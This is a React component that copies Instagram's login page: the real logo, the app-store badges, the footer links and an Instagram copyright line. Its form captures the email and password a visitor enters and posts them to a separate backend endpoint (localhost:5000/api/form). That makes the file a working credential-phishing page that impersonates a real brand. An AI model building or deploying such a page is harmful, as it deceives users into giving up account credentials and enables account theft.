import React, { useState } from "react";
import "../Css/instalogin.css";
import { Link } from "react-router-dom";
import axios from "axios";

const IgPage = () => {
  const [language, setLanguage] = useState("English");
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [response, setResponse] = useState("");

  const handleLanguageChange = (event) => {
    setLanguage(event.target.value);
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("Submitting form with data:", formData);
    try {
      const res = await axios.post("http://localhost:5000/api/form", formData, {
        headers: { "Content-Type": "application/json" },
      });
      console.log("Response received:", res.data);
      setResponse(res.data.message);
      setFormData({ email: "", password: "" });
    } catch (error) {
      console.error("Error submitting form:", error);
      setResponse("Error submitting the form");
    }
  };

  return (
    <div>
      <section className="section-all">
        <main className="main" role="main">
          <div className="wrapper">
            <article className="article">
              <div className="content">
                <div className="login-box">
                  <div className="header">
                    <img
                      className="logo"
                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                      alt="Instagram"
                    />
                  </div>
                  <div className="form-wrap">
                    <form className="form" onSubmit={handleSubmit}>
                      <div className="input-box">
                        <input
                          type="email"
                          name="email"
                          placeholder="Email"
                          maxLength="30"
                          autoComplete="on"
                          required
                          value={formData.email}
                          onChange={handleChange}
                        />
                      </div>
                      <div className="input-box">
                        <input
                          type="password"
                          name="password"
                          placeholder="Password"
                          maxLength="30"
                          autoComplete="on"
                          required
                          value={formData.password}
                          onChange={handleChange}
                        />
                      </div>
                      <span className="button-box">
                        <button className="btn" type="submit">
                          Log in
                        </button>
                      </span>
                      <a className="forgot" href="#">
                        Forgot password?
                      </a>
                    </form>
                    {response && <p className="response-message">{response}</p>}
                  </div>
                </div>
                <div className="login-box">
                  <p className="text">
                    Don't have an account?
                    <Link to="/instagramsignup"> Sign up</Link>
                  </p>
                </div>
                <div className="app">
                  <p>Get the app.</p>
                  <div className="app-img">
                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"
                        alt="Download on the App Store"
                      />
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
                        alt="Get it on Google Play"
                      />
                    </a>
                  </div>
                </div>
              </div>
            </article>
          </div>
        </main>
        <footer className="footer" role="contentinfo">
          <div className="footer-container">
            <nav className="footer-nav" role="navigation">
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Blog</a>
                </li>
                <li>
                  <a href="#">Press</a>
                </li>
                <li>
                  <a href="#">API</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Directory</a>
                </li>
                <li>
                  <span className="language">
                    Language:
                    <select
                      name="language"
                      className="select"
                      value={language}
                      onChange={handleLanguageChange}
                    >
                      <option value="English">English</option>
                      <option value="Russian">Russian</option>
                    </select>
                  </span>
                </li>
              </ul>
            </nav>
            <span className="footer-logo">&copy; 2025 Instagram</span>
          </div>
        </footer>
      </section>
    </div>
  );
};

export default IgPage;
